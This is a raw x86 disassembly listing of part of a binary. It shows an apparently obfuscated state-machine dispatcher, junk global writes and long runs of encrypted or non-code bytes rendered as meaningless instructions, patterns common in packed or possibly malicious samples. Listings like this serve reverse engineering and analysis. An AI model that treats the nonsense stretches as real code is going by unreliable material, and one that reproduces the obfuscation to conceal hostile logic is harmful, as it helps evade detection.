  40e251:	mov    ds:0x462a80fa,eax
  40e256:	int    0x76
  40e258:	idiv   DWORD PTR [esi+eax*4]
  40e25b:	loopne 0x40e228
  40e25d:	sbb    al,bl
  40e25f:	leave  
  40e260:	mov    ch,0x20
  40e262:	mov    dh,0x90
  40e264:	jle    0x40e20a
  40e266:	mov    ds:0x11d9f340,al
  40e26b:	ins    BYTE PTR es:[edi],dx
  40e26c:	dec    esp
  40e26d:	add    edx,DWORD PTR [ecx+ecx*1+0x52]
  40e271:	pop    ss
  40e272:	jne    0x40e2d2
  40e274:	or     ecx,esp
  40e276:	add    BYTE PTR [edi],0x78
  40e279:	or     BYTE PTR [ecx+0x2d],dh
  40e27c:	xor    esi,DWORD PTR [edx]
  40e27e:	call   0xe845:0x89dfedb2
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43360b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4336e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43372b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433697,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43360b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4336d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43369f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43361b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43371f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43372b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4336df,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43371b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x4336d7,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x433653,0x43365f
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x4336a7,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x4336d3,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x4336d7,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433603,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433603,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433697,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433603,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x4336af,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x43372b
  40e3da:	and    DWORD PTR ds:0x43360b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x433663,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433713
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	xchg   ebp,eax
  40e415:	rcl    BYTE PTR [edi+ecx*1],1
  40e418:	push   ss
  40e419:	cwde   
  40e41a:	jle    0x40e49a
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e446
  40e421:	rcr    BYTE PTR [ebx-0x4e],cl
  40e424:	ins    DWORD PTR es:[edi],dx
  40e425:	nop
  40e426:	lods   al,BYTE PTR ds:[esi]
  40e427:	sbb    bl,BYTE PTR [ebx-0x3afaad8]
  40e42d:	xchg   edx,eax
  40e42e:	xchg   esi,eax
  40e42f:	and    ebx,0x15
  40e432:	std    
  40e433:	mov    bl,0x64
  40e435:	push   edx
  40e436:	stc    
  40e437:	add    bl,BYTE PTR [edx+0x10]
  40e43a:	mov    edx,0x21a859af
  40e43f:	mov    ebx,0xd4f959fe
  40e444:	adc    al,0x3f
  40e446:	in     eax,dx
  40e447:	lock pxor mm6,QWORD PTR [ebx]
  40e44b:	xor    esi,DWORD PTR [ebx+ebx*8]
  40e44e:	or     ch,dh
  40e450:	inc    cl
  40e452:	outs   dx,BYTE PTR ds:[esi]
  40e453:	test   DWORD PTR [edi+0x2b],ebx
  40e456:	adc    al,0x5c
  40e458:	push   0xa8b515b7
  40e45d:	inc    edx
  40e45e:	icebp  
  40e45f:	and    esp,DWORD PTR [eiz*4+0x3af0491e]
  40e466:	leave  
  40e467:	jge    0x40e3ed
  40e469:	loop   0x40e4c9
  40e46b:	jmp    0x95db:0xe6a43787
  40e472:	retf   
  40e473:	adc    BYTE PTR [edi-0xe09137e],ch
  40e479:	out    dx,al
  40e47a:	xor    dl,BYTE PTR [edx+0x24e8706c]
  40e480:	addr16 imul esp,edx,0x14
  40e484:	lods   al,BYTE PTR ds:[esi]
  40e485:	mov    dh,0xdb
  40e487:	pop    ds
  40e488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e489:	retf   0xfcc3
  40e48c:	cdq    
  40e48d:	repz es scas al,BYTE PTR es:[edi]
  40e490:	pop    edi
  40e491:	test   eax,0xd7d47719
  40e496:	mov    ds:0x1c16469e,eax
  40e49b:	dec    edx
  40e49c:	cmp    cl,dl
  40e49e:	dec    eax
  40e49f:	inc    ebp
  40e4a0:	mov    ebx,0xbf02a93
  40e4a5:	fs cmc 
  40e4a7:	leave  
  40e4a8:	or     al,ch
  40e4aa:	jb     0x40e4ef
  40e4ac:	test   BYTE PTR [ecx+0x4c],dh
  40e4af:	jo     0x40e52c
  40e4b1:	scas   al,BYTE PTR es:[edi]
  40e4b2:	jp     0x40e4eb
  40e4b4:	addr16 clc 
  40e4b6:	aas    
  40e4b7:	das    
  40e4b8:	xor    al,0x4c
  40e4ba:	lods   al,BYTE PTR ds:[esi]
  40e4bb:	inc    ebp
  40e4bc:	sahf   
  40e4bd:	call   0x787c:0x7ce391d9
  40e4c4:	cli    
  40e4c5:	add    eax,0xecf7fada
  40e4ca:	clc    
  40e4cb:	cmp    BYTE PTR [edx-0x7],0x3c
  40e4cf:	adc    esp,DWORD PTR [edx+0x2573b171]
  40e4d5:	push   ebp
  40e4d6:	add    ebx,esp
  40e4d8:	ret    0x1d8c
  40e4db:	aad    0x7a
  40e4dd:	inc    esi
  40e4de:	test   DWORD PTR [bx+0x1e],ecx
  40e4e2:	pop    esi
  40e4e3:	inc    edx
  40e4e4:	sub    bl,bh
  40e4e6:	mov    bl,0x77
  40e4e8:	and    DWORD PTR [ebp-0x6f0784fb],ecx
  40e4ee:	inc    ecx
  40e4ef:	or     bh,BYTE PTR [edi+0x25]
  40e4f2:	mov    ebp,0x381bc26e
  40e4f7:	mov    cl,0x4a
  40e4f9:	nop
  40e4fa:	call   DWORD PTR [ebx-0x16]
  40e4fd:	leave  
  40e4fe:	jmp    0x9b1:0x3ebad577
  40e505:	or     eax,0x28c68c05
  40e50a:	xor    DWORD PTR [edi-0xd],eax
  40e50d:	cmc    
  40e50e:	mov    dh,0xb8
  40e510:	push   ebp
  40e511:	leave  
  40e512:	and    al,0x91
  40e514:	jo     0x40e4dc
  40e516:	jle    0x40e4c8
  40e518:	test   DWORD PTR [ebx],esp
  40e51a:	in     eax,0xc8
  40e51c:	xor    BYTE PTR [ebp+eax*8-0x68],al
  40e520:	hlt    
  40e521:	in     eax,dx
  40e522:	mov    cl,0xd3
  40e524:	dec    edx
  40e525:	ds test eax,0xa4bb4e7c
  40e52b:	fdiv   QWORD PTR [ecx+0x2f]
  40e52e:	stc    
  40e52f:	sub    DWORD PTR [eax],esi
  40e531:	mov    ds:0xd0216aef,al
  40e536:	sbb    ebp,esp
  40e538:	ret    
  40e539:	lahf   
  40e53a:	repz bound ecx,QWORD PTR [ebx+0xd81f445]
  40e541:	mov    ds:0xeb004336,eax
  40e546:	ss inc ebx
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x4336db,0x4336af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0x96f261b8
  40e5b4:	dec    esp
  40e5b5:	fmul   QWORD PTR [eax+0x2a]
  40e5b8:	cdq    
  40e5b9:	jle    0x40e639
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e628
  40e5c0:	out    0x4,eax
  40e5c2:	cmc    
  40e5c3:	jb     0x40e56f
  40e5c5:	mov    ah,0x3e
  40e5c7:	rcr    DWORD PTR [edi],0x3b
  40e5ca:	rol    BYTE PTR [edi],1
  40e5cc:	daa    
  40e5cd:	push   edx
  40e5ce:	inc    ebp
  40e5cf:	mov    al,ss:0x2e95c94c
  40e5d5:	in     al,0xe6
  40e5d7:	fstp   st(6)
  40e5d9:	add    BYTE PTR [eax],bl
  40e5db:	test   al,0xdc
  40e5dd:	push   esp
  40e5de:	lods   eax,DWORD PTR ds:[esi]
  40e5df:	test   BYTE PTR [esi+0xf999633],dh
  40e5e5:	pop    ecx
  40e5e6:	(bad)  
  40e5e8:	pop    ecx
  40e5e9:	jo     0x40e57d
  40e5eb:	add    eax,0xdb2745a4
  40e5f0:	sbb    DWORD PTR [esi-0x9f81fe5],ebx
  40e5f6:	sbb    BYTE PTR [edi+0x18],dl
  40e5f9:	add    DWORD PTR [edx+0x6],ebx
  40e5fc:	push   edx
  40e5fd:	dec    edi
  40e5fe:	sub    edi,DWORD PTR [ebx-0x7d94a36b]
  40e604:	sub    BYTE PTR [eax+0x35bf1849],bl
  40e60a:	adc    dl,0x9
  40e60d:	and    eax,0x608e8222
  40e612:	repz xchg ebx,eax
  40e614:	pop    es
  40e615:	aaa    
  40e616:	mov    ds:0x854d1dd5,al
  40e61b:	sbb    DWORD PTR [edx-0x47c06439],ebx
  40e621:	mov    esp,0x19436e44
  40e626:	je     0x40e64e
  40e628:	bound  ecx,QWORD PTR [ebx-0x23272b56]
  40e62e:	pusha  
  40e62f:	rol    ecx,1
  40e631:	add    eax,0xbd9b0662
  40e636:	std    
  40e637:	mov    bh,0x11
  40e639:	arpl   WORD PTR [ecx+0x30],si
  40e63c:	add    al,0xe7
  40e63e:	or     eax,0x1ed2852b
  40e643:	dec    esi
  40e644:	(bad)  
  40e645:	mov    ah,0xab
  40e647:	stc    
  40e648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e649:	inc    ecx
  40e64a:	push   0xffffffc8
  40e64c:	and    al,0x5
  40e64e:	loop   0x40e66b
  40e650:	jge    0x40e688
  40e652:	xchg   esi,eax
  40e653:	ds dec edi
  40e655:	iret   
  40e656:	lahf   
  40e657:	mov    eax,0xb8689251
  40e65c:	ss dec edx
  40e65e:	lods   al,BYTE PTR ds:[esi]
  40e65f:	pop    esp
  40e660:	cld    
  40e661:	cli    
  40e662:	(bad)  
  40e663:	loopne 0x40e6c6
  40e665:	lods   al,BYTE PTR ds:[esi]
  40e666:	sub    al,0xf3
  40e668:	push   esi
  40e669:	sbb    al,0x80
  40e66b:	sbb    BYTE PTR [eax-0x3f],cl
  40e66e:	mov    bl,0x33
  40e670:	ds loopne 0x40e622
  40e673:	mov    ecx,0x6ed57273
  40e678:	push   0x728f5eb7
  40e67d:	push   0xffffffa8
  40e67f:	int3   
  40e680:	in     al,dx
  40e681:	inc    ebx
  40e682:	pop    ebp
  40e683:	pop    esi
  40e684:	or     eax,0xc9c84852
  40e689:	jmp    0x52b75c1b
  40e68e:	aas    
  40e68f:	cmp    DWORD PTR [edx-0x1686881f],edx
  40e695:	jns    0x40e62b
  40e697:	jb     0x40e6b5
  40e699:	push   es
  40e69a:	hlt    
  40e69b:	cld    
  40e69c:	mov    dl,0x5c
  40e69e:	mov    ecx,0x2a56768f
  40e6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6a5:	cmp    BYTE PTR [ebx+0x581b6fc8],dl
  40e6ab:	mov    bh,0xf8
  40e6ad:	xchg   esi,eax
  40e6ae:	imul   eax,eax,0xffffffbb
  40e6b1:	mov    eax,ds:0xacdc9b2b
  40e6b6:	jae    0x40e64e
  40e6b8:	adc    edx,DWORD PTR [eax*8+0x603d90d1]
  40e6bf:	jae    0x40e65f
  40e6c1:	test   al,0x5f
  40e6c3:	sbb    BYTE PTR [ebx+0x55],al
  40e6c6:	pop    esp
  40e6c7:	inc    esi
  40e6c8:	add    DWORD PTR [ebx+0x52],esi
  40e6cb:	sti    
  40e6cc:	adc    cl,cl
  40e6ce:	adc    eax,0xbbb3e69a
  40e6d3:	mov    ds:0x7fee4d92,eax
  40e6d8:	jecxz  0x40e71c
  40e6da:	inc    ecx
  40e6db:	mov    eax,ds:0x413b34
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx+0x2547edf4]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6e3
  40e704:	in     al,0x78
  40e706:	scas   al,BYTE PTR es:[edi]
  40e707:	in     eax,dx
  40e708:	fstp   DWORD PTR [esi+0x4f3ff058]
  40e70e:	or     eax,0xebaaeb23
  40e713:	jl     0x40e6f1
  40e715:	dec    ebp
  40e716:	xchg   ebp,eax
  40e717:	out    dx,eax
  40e718:	jo     0x40e72e
  40e71a:	push   0xffffffae
  40e71c:	xchg   esp,esp
  40e71e:	fbstp  TBYTE PTR [ebp+0x6c8a5bd9]
  40e724:	arpl   dx,bx
  40e726:	fdivp  st(2),st
  40e728:	(bad)
  40e72b:	mov    ecx,0xc73a03cb
  40e730:	in     al,0x2f
  40e732:	mov    ah,0xc
  40e734:	test   BYTE PTR [edi-0x34],0xa0
  40e738:	adc    ebx,eax
  40e73a:	xor    ebp,esp
  40e73c:	je     0x40e76f
  40e73e:	scas   al,BYTE PTR es:[edi]
  40e73f:	jns    0x40e761
  40e741:	rcr    DWORD PTR [ebx+0x3a],0x3a
  40e745:	xchg   dx,ax
  40e747:	fstp   TBYTE PTR [edx+0x4]
  40e74a:	or     eax,0xcb036f7
  40e74f:	xchg   ebx,eax
  40e750:	mov    bl,BYTE PTR ds:0x6b0b4cea
  40e756:	mov    ecx,0xb771ae01
  40e75b:	cmc    
  40e75c:	stc    
  40e75d:	xor    BYTE PTR [ecx+eiz*4+0x119eaeaf],bh
  40e764:	in     al,dx
  40e765:	cdq    
  40e766:	xor    eax,0x5dde5d44
  40e76b:	popf   
  40e76c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e76d:	cmp    edi,esp
  40e76f:	mov    cl,0x57
  40e771:	jg     0x40e7f2
  40e773:	inc    edx
  40e774:	sar    dl,cl
  40e776:	es in  eax,dx
  40e778:	stos   BYTE PTR es:[edi],al
  40e779:	lock test ebx,edi
  40e77c:	fsubr  DWORD PTR [ecx+0x4365e805]
  40e782:	jmp    0x40e748
  40e784:	sbb    al,0xc5
  40e786:	arpl   WORD PTR [esi],bp
  40e788:	dec    ebp
  40e789:	push   edx
  40e78a:	xchg   ecx,eax
  40e78b:	rol    al,0x45
  40e78e:	pop    ebp
  40e78f:	inc    esi
  40e790:	xor    dh,BYTE PTR [ebx*1+0x7ffa4f]
  40e797:	into   
  40e798:	mov    ebx,0x6cd4ce93
  40e79d:	cli    
  40e79e:	push   0xfffffffb
  40e7a0:	inc    edi
  40e7a1:	or     eax,0x8f88fff6
  40e7a6:	sbb    DWORD PTR ds:0x79010491,edx
  40e7ac:	mov    gs,ebx
  40e7ae:	ror    BYTE PTR [di],cl
  40e7b1:	stos   DWORD PTR es:[edi],eax
  40e7b2:	jbe    0x40e741
  40e7b4:	mov    eax,ds:0x236bdb1b
  40e7b9:	xchg   esi,eax
  40e7ba:	shr    BYTE PTR [edi-0xa201c2e],1
  40e7c0:	sbb    bl,BYTE PTR [esi+0x79465a65]
  40e7c6:	jge    0x40e796
  40e7c8:	into   
  40e7c9:	lock cmp BYTE PTR [esi],bh
  40e7cc:	aaa    
  40e7cd:	aad    0xad
  40e7cf:	ins    DWORD PTR es:[edi],dx
  40e7d0:	jmp    0x6e7f:0x29b02a40
  40e7d7:	(bad)
  40e7db:	pop    edx
  40e7dc:	shr    DWORD PTR [ebp+0x42e24283],1
  40e7e2:	pop    DWORD PTR [ecx-0x11]
  40e7e5:	imul   edx,DWORD PTR [ebx-0x3cbbb80b],0x28
  40e7ec:	adc    BYTE PTR [edi+eax*4],dl
  40e7ef:	pop    es
  40e7f0:	(bad)  
  40e7f1:	jl     0x40e852
  40e7f3:	pop    esp
  40e7f4:	jg     0x40e776
  40e7f6:	jae    0x40e873
  40e7f8:	ret    
  40e7f9:	(bad)  
  40e7fa:	push   esi
  40e7fb:	dec    esp
  40e7fc:	or     bl,BYTE PTR [edi]
  40e7fe:	inc    edx
  40e7ff:	sbb    eax,0x77f1d2fa
  40e804:	out    dx,eax
  40e805:	call   0xc123:0x1a055589
  40e80c:	adc    bl,BYTE PTR [edi]
  40e80e:	dec    ebp
  40e80f:	mov    ?,WORD PTR [edx]
  40e811:	out    0x19,eax
  40e813:	popa   
  40e814:	test   DWORD PTR [esp+eax*4],esp
  40e817:	imul   esp,DWORD PTR [ebx+0x22fa1dee],0x61
  40e81e:	inc    edi
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e83a
  40e854:	nop
  40e855:	add    edx,DWORD PTR [esi-0x1e]
  40e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e820
  40e860:	aad    0x4e
  40e862:	dec    esp
  40e863:	sub    al,0x22
  40e865:	pop    ss
  40e866:	mov    bl,0xfa
  40e868:	aad    0xf8
  40e86a:	mov    cl,0x5e
  40e86c:	arpl   bp,dx
  40e86e:	fild   WORD PTR [edi+0x6c0b94f9]
  40e874:	sar    BYTE PTR [eax+0x446887eb],1
  40e87a:	int3   
  40e87b:	cli    
  40e87c:	mov    ch,0xb6
  40e87e:	ret    
  40e87f:	es ret 
  40e881:	retf   
  40e882:	jmp    0x40e8a9
  40e884:	mov    al,ds:0x67371f25
  40e889:	jg     0x40e83c
  40e88b:	dec    ebp
  40e88c:	cmp    eax,0xb2b67104
  40e891:	inc    esp
  40e892:	xor    DWORD PTR [esi*4-0x1994a8f4],esp
  40e899:	inc    esi
  40e89a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e89b:	push   ecx
  40e89c:	in     al,0x31
  40e89e:	arpl   ax,cx
  40e8a0:	inc    ebx
  40e8a1:	and    al,0xbd
  40e8a3:	scas   eax,DWORD PTR es:[edi]
  40e8a4:	loopne 0x40e879
  40e8a6:	cld    
  40e8a7:	test   BYTE PTR [edi],al
  40e8a9:	cwde   
  40e8aa:	xor    ah,BYTE PTR [ecx-0x273a10cd]
  40e8b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8b1:	stos   DWORD PTR es:[edi],eax
  40e8b2:	arpl   WORD PTR [edi+0x6f],di
  40e8b5:	sbb    eax,0x7a835206
  40e8ba:	mov    DWORD PTR [edx-0x7e53ff93],esp
  40e8c0:	pop    esp
  40e8c1:	mov    esp,0x1610d386
  40e8c6:	test   DWORD PTR [ebx],0x1d8189c1
  40e8cc:	push   esi
  40e8cd:	leave  
  40e8ce:	sbb    BYTE PTR [esi-0x189e79f0],bh
  40e8d4:	aam    0x69
  40e8d6:	fisttp DWORD PTR [ebp-0x2d7934b7]
  40e8dc:	pushf  
  40e8dd:	mov    al,0xa
  40e8df:	sbb    edx,esi
  40e8e1:	push   ebx
  40e8e2:	aam    0x9e
  40e8e4:	push   esi
  40e8e5:	sub    bl,BYTE PTR [ebp-0x11]
  40e8e8:	retf   0xecb8
  40e8eb:	or     al,0x85
  40e8ed:	push   esi
  40e8ee:	dec    eax
  40e8ef:	rol    DWORD PTR [ebp-0x37],1
  40e8f2:	cmp    dl,BYTE PTR [ebx]
  40e8f4:	test   DWORD PTR [eax-0x69],ecx
  40e8f7:	adc    DWORD PTR [edx+ebx*8],esi
  40e8fa:	xor    cl,dh
  40e8fc:	ja     0x40e926
  40e8fe:	out    dx,eax
  40e8ff:	out    dx,eax
  40e900:	fwait
  40e901:	push   0xffffffdf
  40e903:	mov    BYTE PTR [ebx+0x547d8922],bh
  40e909:	and    bl,dh
  40e90b:	pop    ecx
  40e90c:	push   edi
  40e90d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e90e:	out    0xc1,eax
  40e910:	cmc    
  40e911:	mov    ebp,0x341562ab
  40e916:	xor    ch,0xb8
  40e919:	jne    0x40e955
  40e91b:	ret    
  40e91c:	bound  eax,QWORD PTR [eax-0x885eaea]
  40e922:	xchg   edi,eax
  40e923:	jmp    0xb461:0x8d0cb70a
  40e92a:	and    DWORD PTR fs:[esi-0x606e1736],edi
  40e931:	(bad)
  40e935:	push   ss
  40e936:	cmp    BYTE PTR [eax],0xa8
  40e939:	std    
  40e93a:	call   0x447e4994
  40e93f:	stos   BYTE PTR es:[edi],al
  40e940:	stos   BYTE PTR es:[edi],al
  40e941:	js     0x40e8e8
  40e943:	pop    eax
  40e944:	idiv   BYTE PTR [ebx-0x74]
  40e947:	mov    esi,0x87c76f2e
  40e94c:	add    DWORD PTR [ecx+0x5d9ffab6],0xf5ddd882
  40e956:	mov    al,ds:0x7daf25ed
  40e95b:	pushf  
  40e95c:	adc    eax,0x32a26517
  40e961:	mov    edx,0x2bf442c7
  40e966:	ret    0xd397
  40e969:	fsub   st,st(3)
  40e96b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e96c:	rcr    BYTE PTR [edx],cl
  40e96e:	mov    bh,BYTE PTR [esi+eax*4+0x618b56b]
  40e975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e976:	in     al,0x7
  40e978:	pushf  
  40e979:	and    edx,DWORD PTR [eax-0x6c17af1]
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xe72f431d
  40e99c:	add    DWORD PTR [esi+0x127e7ea4],0xff7e7e7f
  40e9a6:	mov    edx,0xd1c98a88
  40e9ab:	(bad)  
  40e9ac:	outs   dx,BYTE PTR ds:[esi]
  40e9ad:	ja     0x40e993
  40e9af:	or     dl,BYTE PTR [ebx]
  40e9b1:	mov    dl,0x4c
  40e9b3:	sahf   
  40e9b4:	xor    edi,ebp
  40e9b6:	stos   BYTE PTR es:[edi],al
  40e9b7:	shl    BYTE PTR [eax-0x1899b37c],0xb
  40e9be:	or     eax,0x73350839
  40e9c3:	fidivr WORD PTR [eax*4-0x24ff6cbe]
  40e9ca:	jle    0x40e971
  40e9cc:	mov    ds:0x4aba4f29,al
  40e9d1:	mov    ds:0xa565af6e,eax
  40e9d6:	stos   BYTE PTR es:[edi],al
  40e9d7:	jp     0x40e993
  40e9d9:	dec    eax
  40e9da:	mov    esi,0xfb5665b9
  40e9df:	(bad)  
  40e9e0:	in     al,dx
  40e9e1:	into   
  40e9e2:	lods   eax,DWORD PTR ds:[esi]
  40e9e3:	jne    0x40ea45
  40e9e5:	mov    ds:0x9b075023,al
  40e9ea:	mov    eax,ds:0xb7e21b1c
  40e9ef:	mov    es,WORD PTR [ecx+0x31]
  40e9f2:	pop    eax
  40e9f3:	inc    edi
  40e9f4:	adc    al,0xc4
  40e9f6:	popa   
  40e9f7:	fs mov edx,0x98c22556
  40e9fd:	out    dx,eax
  40e9fe:	in     eax,0x3f
  40ea00:	inc    ebx
  40ea01:	sub    eax,0x758af733
  40ea06:	ret    
  40ea07:	fimul  WORD PTR [edi-0x22f54096]
  40ea0d:	push   esi
  40ea0e:	push   0xffffffd3
  40ea10:	and    ecx,DWORD PTR [ecx+0x4d]
  40ea13:	xchg   ebx,eax
  40ea14:	adc    DWORD PTR [ebp-0x6c9c9c1b],ebx
  40ea1a:	dec    eax
  40ea1b:	cmp    esi,DWORD PTR [edi-0x1a05eb91]
  40ea21:	push   ebx
  40ea22:	fmul   QWORD PTR [ebx+0x1f]
  40ea25:	call   0xeecb905c
  40ea2a:	sahf   
  40ea2b:	jg     0x40ea5e
  40ea2d:	in     al,0xc0
  40ea2f:	mov    DWORD PTR [ebx+0x30],esi
  40ea32:	push   es
  40ea33:	retf   0xd49b
  40ea36:	rcl    DWORD PTR ds:0x24396b3b,0xaf
  40ea3d:	mov    esi,0x70f06b2f
  40ea42:	push   ebx
  40ea43:	stos   DWORD PTR es:[edi],eax
  40ea44:	inc    edx
  40ea45:	mov    WORD PTR [ebx],fs
  40ea47:	inc    ecx
  40ea48:	jne    0x40ea85
  40ea4a:	or     ebx,ebx
  40ea4c:	in     eax,dx
  40ea4d:	(bad)  
  40ea4e:	cmc    
  40ea4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea50:	and    ebx,DWORD PTR [edx+0x41]
  40ea53:	imul   DWORD PTR [eax]
  40ea55:	cli    
  40ea56:	push   ecx
  40ea57:	test   BYTE PTR [edi+0x77241794],dl
  40ea5d:	inc    esi
  40ea5e:	mov    bh,ah
  40ea60:	or     dh,BYTE PTR [ebx+0x4d]
  40ea63:	or     bl,BYTE PTR [ecx+edi*4]
  40ea66:	scas   al,BYTE PTR es:[edi]
  40ea67:	push   ebx
  40ea68:	add    edx,DWORD PTR [ecx+0x62]
  40ea6b:	inc    ebp
  40ea6c:	mov    edx,0xcf98e64d
  40ea71:	sbb    edi,ebp
  40ea73:	push   es
  40ea74:	ins    DWORD PTR es:[edi],dx
  40ea75:	stos   BYTE PTR es:[edi],al
  40ea76:	stos   BYTE PTR es:[edi],al
  40ea77:	lods   eax,DWORD PTR ds:[esi]
  40ea78:	ins    DWORD PTR es:[edi],dx
  40ea79:	ret    
  40ea7a:	(bad)  
  40ea7b:	mov    esp,0x19685ea4
  40ea80:	call   0x9966:0x6fe68c33
  40ea87:	xchg   ebx,eax
  40ea88:	cli    
  40ea89:	sub    BYTE PTR [ecx],dl
  40ea8b:	pop    ebp
